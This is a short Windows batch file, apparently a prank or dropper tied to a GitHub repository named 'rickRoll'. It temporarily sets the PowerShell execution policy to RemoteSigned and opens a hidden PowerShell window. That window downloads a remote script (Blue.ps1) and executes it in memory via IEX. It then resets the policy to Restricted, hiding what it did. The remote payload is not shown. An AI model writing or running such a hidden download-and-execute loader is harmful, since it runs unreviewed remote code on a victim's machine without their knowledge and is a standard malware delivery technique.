@echo off
powershell Set-ExecutionPolicy -Scope CurrentUser RemoteSigned
powershell powershell -w hidden 'IEX (New-Object Net.WebClient).DownloadString('https://github.com/CHONK12/rickRoll/raw/main/Blue.ps1');'
powershell Set-ExecutionPolicy -Scope CurrentUser Restricted
